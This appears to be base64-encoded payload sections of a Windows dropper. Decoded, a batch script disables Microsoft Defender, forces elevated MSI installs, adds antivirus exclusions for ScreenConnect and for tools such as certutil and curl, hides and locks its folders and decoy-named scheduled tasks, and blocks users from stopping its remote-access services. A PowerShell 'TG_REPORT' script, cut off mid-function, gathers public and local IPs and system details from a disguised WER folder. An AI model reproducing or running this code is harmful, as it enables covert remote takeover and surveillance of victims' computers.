JVN5c3RlbVJvb3QlXFN5c3RlbTMyXFRhc2tzIg0KDQppZiBub3QgZXhpc3QgIiVXRCUiIG1rZGly
ICIlV0QlIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEMiUiIG1rZGlyICIlV0QyJSIgPm51
bCAyPiYxDQplY2hvIHNlY3VyZV9iZWdpbiAlREFURSUgJVRJTUUlIFM5Pj4iJUxPRyUiDQoNClJF
TSAtLS0gTmV1dHJhbGl6ZSBNU0kgYmxvY2sgcG9saWNpZXMgKDE2MjUpIC0tLQ0KUkVNIERpc2Fi
bGVNU0k6IDA9YWxsb3csIDE9bm9uLWFkbWluIG9ubHksIDI9YWxsIC0+IGZvcmNlIDANCnJlZyBh
ZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAv
diBEaXNhYmxlTVNJIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtM
TVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IEFsd2F5
c0luc3RhbGxFbGV2YXRlZCAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBkZWxl
dGUgIkhLQ1VcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAv
diBEaXNhYmxlTVNJIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtDVVxTT0ZUV0FSRVxQb2xpY2ll
c1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IEFsd2F5c0luc3RhbGxFbGV2YXRlZCAv
dCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCg0KUkVNIC0tLSBEZWZlbmRlcjogcmVnaXN0
cnkgZXhjbHVzaW9ucyAocG9saWN5ICsgcHJlZmVyZW5jZSBrZXlzKSAtLS0NCnJlZyBhZGQgIkhL
TE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXIiIC92IERpc2Fi
bGVBbnRpU3B5d2FyZSAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhL
TE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1l
IFByb3RlY3Rpb24iIC92IERpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9k
IDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29m
dFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlQmVoYXZp
b3JNb25pdG9yaW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtM
TVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFsLVRpbWUg
UHJvdGVjdGlvbiIgL3YgRGlzYWJsZUlPQVZQcm90ZWN0aW9uIC90IFJFR19EV09SRCAvZCAxIC9m
ID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2lu
ZG93cyBEZWZlbmRlclxSZWFsLVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZVNjcmlwdFNjYW5u
aW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVdEJSIg
L3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1p
Y3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlV0QyJSIgL3Qg
UkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jv
c29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICJDOlxXaW5kb3dzXFRl
bXAiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVRFTVAl
IiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
TWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2Ny
ZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+
JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhj
bHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMiUpIiAv
dCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWlj
cm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVLRUVQMyUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVz
aW9uc1xQYXRocyIgL3YgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiIC90
IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNy
b3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYlXFNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYx
DQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMyUpIiAv
dCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCmZvciAlJVAgaW4gKG1zaWV4ZWMuZXhlIGN1
cmwuZXhlIGNtZC5leGUgcG93ZXJzaGVsbC5leGUgY2VydHV0aWwuZXhlIFNjcmVlbkNvbm5lY3Qu
Q2xpZW50U2VydmljZS5leGUgU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZSkgZG8gKA0K
ICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
CikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2VyIHRoYW4g
cmVnIGFsb25lKSAtLS0NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZl
IC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZl
cmVuY2U9J1NpbGVudGx5Q29udGludWUnOyIgXg0KICAiVHJ5e1NldC1NcFByZWZlcmVuY2UgLURp
c2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVC
ZWhhdmlvck1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVJT0FWUHJv
dGVjdGlvbiAkdHJ1ZTsgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0
cnVlfUNhdGNoe307IiBeDQogICIkcGF0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2luZG93c1xU
ZW1wJywkZW52OlRFTVAsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpJywnJVBG
JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSknLCclUEY4NiVcU2NyZWVuQ29ubmVjdCBD
bGllbnQgKCVLRUVQMSUpJywnJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKScp
OyIgXg0KICAidHJ5eyRwYXRocys9QChHZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJvZ3JhbUZp
bGVzIC1GaWx0ZXIgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEgMCB8IEZv
ckVhY2gtT2JqZWN0IHskXy5GdWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBmODY9W0Vu
dmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7IGlmKCRwZjg2KXsk
cGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAtRmlsdGVyICdTY3JlZW5Db25uZWN0
IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVsbE5hbWV9
KX19Y2F0Y2h7fTsiIF4NCiAgImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1PYmplY3Qg
LVVuaXF1ZSkpeyBpZigkcCAtYW5kIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRwKSl7IEFkZC1N
cFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHAgLUVBIDAgfSB9OyIgXg0KICAiZm9yZWFjaCgk
eCBpbiBAKCdtc2lleGVjLmV4ZScsJ2N1cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hlbGwuZXhl
JywnY2VydHV0aWwuZXhlJywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScsJ1NjcmVl
bkNvbm5lY3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lv
blByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvbkV4
dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIgPm51bCAyPiYxDQoNClJFTSAtLS0g
QUNMOiBvbmx5IFNZU1RFTSArIEFkbWluaXN0cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAtLS0NCmNh
bGwgOkxvY2tEaXIgIiVXRCUiDQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0tLSBoaWRl
IHdvcmtkaXJzICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVXRCUiID5u
dWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpSRU0gUzU6IGRvIE5PVCBo
aWRlL2xvY2sgdGhlIG11dGFibGUgcGF5bG9hZCBzY3JpcHRzIC0gY29weS9tb3ZlIG92ZXIgK2gg
K3MgZmlsZXMNClJFTSBmYWlscyBzaWxlbnRseSBhbmQgZnJvemUgdGhlIHdob2xlIGZsZWV0J3Mg
c2VsZi11cGRhdGUuIEhpZGRlbiBkaXJzIGNvbmNlYWwgY29udGVudHMgYWxyZWFkeS4NCmZvciAl
JUYgaW4gKHBrZy5tc2kgbm90aWZ5LmNmZyBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikgZG8gKA0K
ICBpZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwgMj4mMQ0K
KQ0KDQpSRU0gLS0tIEFDTDogc2NoZWR1bGVkIHRhc2sgWE1MIChoYXJkZXIgdG8gZGVsZXRlIHdp
dGhvdXQgQWRtaW4pIC0tLQ0KUkVNIFM2OiBuYW1lcyBjb250YWluIHNwYWNlcyAoIlNlcnZlciBE
aWFnbm9zdGljcyIpIC0gdGhlIGNtZCBGT1IgbG9vcCBzcGxpdA0KUkVNIHRoZW0gaW50byBnYXJi
YWdlIHRva2Vucy4gUG93ZXJTaGVsbCByZWFkcyBpZGVudGl0eS5jZmcgZGlyZWN0bHkgaW5zdGVh
ZC4NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Q
b2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZlcmVuY2U9J1NpbGVu
dGx5Q29udGludWUnOyAkbmFtZXM9QCgpOyIgXg0KICAiaWYoVGVzdC1QYXRoIC1MaXRlcmFsUGF0
aCAnJVdEJVxpZGVudGl0eS5jZmcnKXsgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICclV0QlXGlk
ZW50aXR5LmNmZycgLUZvcmNlIHwgRm9yRWFjaC1PYmplY3QgeyBpZigkXyAtbWF0Y2ggJ15UQVNL
X1tBLURdPSguKykkJyl7ICRuYW1lcyArPSAkbWF0Y2hlc1sxXS5UcmltKCkuVHJpbVN0YXJ0KCdc
JykgfSB9IH0iIF4NCiAgImVsc2UgeyAkbmFtZXM9QCgnV2VyUXVldWVTeW5jJywnUGxhU2VydmVy
SGVhbHRoJywnV2RpSG9zdFByb3h5JywnVGNwSXBDb25mbGljdFJlcycpIH07IiBeDQogICJmb3Jl
YWNoKCRuIGluICRuYW1lcyl7ICRmID0gSm9pbi1QYXRoICclVEFTS1JPT1QlJyAkbjsgaWYoVGVz
dC1QYXRoIC1MaXRlcmFsUGF0aCAkZil7ICYgaWNhY2xzLmV4ZSAkZiAvaW5oZXJpdGFuY2U6ciB8
IE91dC1OdWxsOyAmIGljYWNscy5leGUgJGYgL2dyYW50OnIgJ05UIEFVVEhPUklUWVxTWVNURU06
RicgJ0JVSUxUSU5cQWRtaW5pc3RyYXRvcnM6RicgfCBPdXQtTnVsbDsgJiBhdHRyaWIuZXhlICto
ICtzICRmIHwgT3V0LU51bGwgfSB9IiA+bnVsIDI+JjENCg0KUkVNIC0tLSBBQ0w6IFdNSSB3YXRj
aGRvZyBzdWJzY3JpcHRpb24gZmlsZXMgKGNoYWluIDIpIC0tLQ0KaWNhY2xzICIlU3lzdGVtUm9v
dCVcU3lzdGVtMzJcd2JlbVxSZXBvc2l0b3J5IiAvZ3JhbnQgIk5UIEFVVEhPUklUWVxTWVNURU06
RiIgPm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBkbyBOT1QgTG9ja0RpciBTY3JlZW5Db25uZWN0
IGluc3RhbGwgZGlycyAtLS0NClJFTSB0YWtlb3duK3N0cmlwIG9uIGxpdmUgU0MgZGlycyBicmVh
a3MgY2xpZW50IGZpbGUgd3JpdGVzL3VwZGF0ZXMg4oaSIHBhbmVsIE9GRkxJTkUNClJFTSB3aGls
ZSBzZXJ2aWNlIHN0aWxsIGxvb2tzIFJ1bm5pbmcuIERlZmVuZGVyIGV4Y2x1c2lvbnMgKyBzZXJ2
aWNlIFNEIGFyZSBlbm91Z2guDQpSRU0gTzM3OiBvbmUtc2hvdCB1bmxvY2sgaWYgYSBwcmlvciBi
dWlsZCBMb2NrRGlyJ2QgdGhlc2UgcGF0aHMuDQppZiBleGlzdCAiJVdEJVxzZWN1cmVfc2MuZmxh
ZyIgKA0KICBmaW5kc3RyIC9DOiJzY19ub2xvY2tfZGlycyIgIiVXRCVcc2VjdXJlX3NjLmZsYWci
ID5udWwgMj4mMQ0KICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gc2NfdW5sb2NrX3ByaW9y
X2xvY2tkaXI+PiIlTE9HJSINCiAgICBmb3IgJSVEIGluICgNCiAgICAgICIlUEYlXFNjcmVlbkNv
bm5lY3QgQ2xpZW50ICglS0VFUDElKSINCiAgICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglS0VFUDIlKSINCiAgICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSIN
CiAgICAgICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIg0KICAgICAgIiVQ
Rjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQogICAgICAiJVBGODYlXFNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCiAgICApIGRvICgNCiAgICAgIGlmIGV4aXN0ICIl
JX5EIiAoDQogICAgICAgIHRha2Vvd24gL0YgIiUlfkQiIC9SIC9EIFkgPm51bCAyPiYxDQogICAg
ICAgIGljYWNscyAiJSV+RCIgL3Jlc2V0IC9UIC9DIC9RID5udWwgMj4mMQ0KICAgICAgICBpY2Fj
bHMgIiUlfkQiIC9ncmFudCAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElO
XEFkbWluaXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQogICAgICApDQogICAgKQ0KICAg
IGVjaG8gc2Nfbm9sb2NrX2RpcnM+JVdEJVxzZWN1cmVfc2MuZmxhZw0KICApDQopIGVsc2UgKA0K
ICBlY2hvIHNjX25vbG9ja19kaXJzPiVXRCVcc2VjdXJlX3NjLmZsYWcNCikNCg0KUkVNIC0tLSBT
QyBzZXJ2aWNlczogU1lTVEVNIGNhbiBjb25maWcvc3RvcC9kZWxldGU7IEJBIGZ1bGw7IHVzZXJz
IGJsb2NrZWQgLS0tDQpSRU0gU1k6IENDIERDIExDIFNXIFJQIERUIExPIFJDICAobm8gU0QgLT4g
Y2Fubm90IGNoYW5nZSB0aGlzIFNEIGl0c2VsZikNCnNldCAiU0Q9RDooQTs7Q0NEQ0xDU1dSUFdQ
RFRMT0NSUkM7OztTWSkoQTs7Q0NEQ0xDU1dSUFdQRFRMT0NSU0RSQ1dEV087OztCQSkiDQpzYy5l
eGUgc2RzZXQgIiVQUklNJSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlQUxUJSIg
IiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlR1JZWEElIiAiJVNEJSIgPm51bCAyPiYx
DQpzYy5leGUgY29uZmlnICIlUFJJTSUiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0Kc2MuZXhlIGNv
bmZpZyAiJUFMVCUiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJUdSWVhB
JSIgc3RhcnQ9IGF1dG8gPm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJVBSSU0lIiByZXNldD0g
ODY0MDAgYWN0aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAg
Pm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJUFMVCUiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSBy
ZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMCA+bnVsIDI+JjENCnNjLmV4
ZSBmYWlsdXJlICIlR1JZWEElIiByZXNldD0gODY0MDAgYWN0aW9ucz0gcmVzdGFydC82MDAwMC9y
ZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAgPm51bCAyPiYxDQoNCmVjaG8gc2VjdXJlX2RvbmU+
PiIlTE9HJSINCmV4aXQgL2IgMA0KDQo6TG9ja0Rpcg0Kc2V0ICJUPSV+MSINCmlmIG5vdCBleGlz
dCAiJVQlIiBleGl0IC9iIDANClJFTSB0YWtlIG93bmVyc2hpcCB0aGVuIHN0cmlwIGluaGVyaXRl
ZCBBQ0VzOyBTWVNURU0rQWRtaW5zIG9ubHkNCnRha2Vvd24gL0YgIiVUJSIgL1IgL0QgWSA+bnVs
IDI+JjENCmljYWNscyAiJVQlIiAvaW5oZXJpdGFuY2U6ciA+bnVsIDI+JjENCmljYWNscyAiJVQl
IiAvZ3JhbnQ6ciAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFkbWlu
aXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQppY2FjbHMgIiVUJSIgL3JlbW92ZTpnICJV
c2VycyIgIkF1dGhlbnRpY2F0ZWQgVXNlcnMiICJFdmVyeW9uZSIgIk5UIEFVVEhPUklUWVxJTlRF
UkFDVElWRSIgIkJVSUxUSU5cVXNlcnMiID5udWwgMj4mMQ0KZXhpdCAvYiAwDQo=
::B64_SEC_END
::B64_TGR_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIFRHX1JFUE9SVCBCVUlMRCAyMDI2MDgwMlQxNiAtIHJv
b3QtbGV2ZWwgdGFzayBuYW1lcyAoSURFTlRWRVI9Nyk7IFRSIG93bmVyc2hpcDsgUk1NK0RhdHRv
IGtlZXA7IGR5bmFtaWMgZ3J5eGEgRlAKcGFyYW0oCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9
ICR0cnVlKV1bc3RyaW5nXSRTdGF0ZSwKICAgIFtzdHJpbmddJFN1bW1hcnkgPSAnJywKICAgIFtz
dHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRl
bXBcLnd1Y2FjaGUnLAogICAgW3N0cmluZ10kT2xkU3RhdGUgPSAnJywKICAgIFtWYWxpZGF0ZVNl
dCgncmljaCcsICdjb21wYWN0JyldW3N0cmluZ10kTW9kZSA9ICdyaWNoJywKICAgIFtzdHJpbmdd
JEJ1aWxkID0gJ08xNScsCiAgICBbc3RyaW5nXSRDb3VudCA9ICcwJwopCgokRXJyb3JBY3Rpb25Q
cmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnCiRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnU2ls
ZW50bHlDb250aW51ZScKdHJ5IHsgW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQ
cm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMiB9IGNhdGNoIHt9Cgpm
dW5jdGlvbiBHZXQtQ2ZnIHsKICAgICRwYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdub3RpZnku
Y2ZnJwogICAgJGNmZyA9IEB7fQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcGF0aCkpIHsgcmV0
dXJuICRjZmcgfQogICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRwYXRoIHwgRm9yRWFjaC1P
YmplY3QgewogICAgICAgIGlmICgkXyAtbWF0Y2ggJ15ccyooW0EtWmEtejAtOV9dKylccyo9XHMq
KC4qKVxzKiQnKSB7CiAgICAgICAgICAgICRjZmdbJG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0u
VHJpbSgpCiAgICAgICAgfQogICAgfQogICAgcmV0dXJuICRjZmcKfQoKZnVuY3Rpb24gRXNjKFtz
dHJpbmddJHMpIHsKICAgIGlmICgkbnVsbCAtZXEgJHMpIHsgcmV0dXJuICcnIH0KICAgIHJldHVy
biAoJHMgLXJlcGxhY2UgJyYnLCAnJmFtcDsnIC1yZXBsYWNlICc8JywgJyZsdDsnIC1yZXBsYWNl
ICc+JywgJyZndDsnKQp9CgpmdW5jdGlvbiBHZXQtUHVibGljSXAgewogICAgZm9yZWFjaCAoJHUg
aW4gQCgKICAgICAgICAgICAgJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycsCiAgICAgICAgICAgICdo
dHRwczovL2lmY29uZmlnLm1lL2lwJywKICAgICAgICAgICAgJ2h0dHBzOi8vaWNhbmhhemlwLmNv
bScKICAgICAgICApKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJHIgPSBJbnZva2UtV2Vi
UmVxdWVzdCAtVXJpICR1IC1Vc2VCYXNpY1BhcnNpbmcgLVRpbWVvdXRTZWMgNgogICAgICAgICAg
ICAkaXAgPSAoJHIuQ29udGVudCB8IE91dC1TdHJpbmcpLlRyaW0oKQogICAgICAgICAgICBpZiAo
JGlwIC1tYXRjaCAnXlxkezEsM30oXC5cZHsxLDN9KXszfSQnIC1vciAkaXAgLW1hdGNoICc6Jykg
eyByZXR1cm4gJGlwIH0KICAgICAgICB9IGNhdGNoIHt9CiAgICB9CiAgICByZXR1cm4gJ24vYScK
fQoKZnVuY3Rpb24gR2V0LUxvY2FsSXBzIHsKICAgIHRyeSB7CiAgICAgICAgJGlwcyA9IEdldC1O
ZXRJUEFkZHJlc3MgLUFkZHJlc3NGYW1pbHkgSVB2NCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLklQQWRkcmVzcyAtbm90bGlrZSAn
MTI3LionIC1hbmQgJF8uUHJlZml4T3JpZ2luIC1uZSAnV2VsbEtub3duJyB9IHwKICAgICAgICAg
ICAgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgSVBBZGRyZXNzIC1VbmlxdWUKICAgICAg
ICBpZiAoJGlwcykgeyByZXR1cm4gKCRpcHMgLWpvaW4gJywgJykgfQogICAgfSBjYXRjaCB7fQog
ICAgdHJ5IHsKICAgICAgICAkaXBzID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX05ldHdvcmtBZGFw
dGVyQ29uZmlndXJhdGlvbiAtRmlsdGVyICdJUEVuYWJsZWQ9VHJ1ZScgfAogICAgICAgICAgICBG
b3JFYWNoLU9iamVjdCB7ICRfLklQQWRkcmVzcyB9IHwgV2hlcmUtT2JqZWN0IHsgJF8gLWFuZCAk
XyAtbm90bGlrZSAnMTI3LionIC1hbmQgJF8gLW5vdGxpa2UgJyo6KicgfQogICAgICAgIGlmICgk
aXBzKSB7IHJldHVybiAoKCRpcHMgfCBTZWxlY3QtT2JqZWN0IC1VbmlxdWUpIC1qb2luICcsICcp
IH0KICAgIH0gY2F0Y2gge30KICAgIHJldHVybiAnbi9hJwp9CgpmdW5jdGlvbiBHZXQtT3NJbmZv
IHsKICAgICRvID0gW29yZGVyZWRdQHsKICAgICAgICBDYXB0aW9uID0gJ24vYSc7IFZlcnNpb24g
PSAnbi9hJzsgQnVpbGQgPSAnbi9hJzsgQXJjaCA9ICduL2EnCiAgICAgICAgRG9tYWluID0gJ24v
YSc7IEluc3RhbGxEYXRlID0gJ24vYSc7IExhc3RCb290ID0gJ24vYScKICAgICAgICBDUFUgPSAn
bi9hJzsgTWFudWZhY3R1cmVyID0gJ24vYSc7IE1vZGVsID0gJ24vYSc7IFNlcmlhbCA9ICduL2En
CiAgICAgICAgVG90YWxSQU1fR0IgPSAnbi9hJzsgRGlza0ZyZWVfR0IgPSAnbi9hJzsgRGlza1Np
emVfR0IgPSAnbi9hJwogICAgfQogICAgdHJ5IHsKICAgICAgICAkb3MgPSBHZXQtQ2ltSW5zdGFu
Y2UgV2luMzJfT3BlcmF0aW5nU3lzdGVtCiAgICAgICAgJG8uQ2FwdGlvbiA9ICRvcy5DYXB0aW9u
CiAgICAgICAgJG8uVmVyc2lvbiA9ICRvcy5WZXJzaW9uCiAgICAgICAgJG8uQnVpbGQgPSAkb3Mu
QnVpbGROdW1iZXIKICAgICAgICAkby5BcmNoID0gJG9zLk9TQXJjaGl0ZWN0dXJlCiAgICAgICAg
JG8uSW5zdGFsbERhdGUgPSAoJG9zLkluc3RhbGxEYXRlIHwgR2V0LURhdGUgLUZvcm1hdCAneXl5
eS1NTS1kZCcpCiAgICAgICAgJG8uTGFzdEJvb3QgPSAoJG9zLkxhc3RCb290VXBUaW1lIHwgR2V0
LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbScpCiAgICAgICAgJG8uVG90YWxSQU1fR0Ig
PSBbbWF0aF06OlJvdW5kKCRvcy5Ub3RhbFZpc2libGVNZW1vcnlTaXplIC8gMU1CLCAxKQogICAg
fSBjYXRjaCB7fQogICAgdHJ5IHsKICAgICAgICAkY3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJf
Q29tcHV0ZXJTeXN0ZW0KICAgICAgICAkby5Eb21haW4gPSBpZiAoJGNzLlBhcnRPZkRvbWFpbikg
eyAkY3MuRG9tYWluIH0gZWxzZSB7ICRjcy5Xb3JrZ3JvdXAgfQogICAgICAgICRvLk1hbnVmYWN0
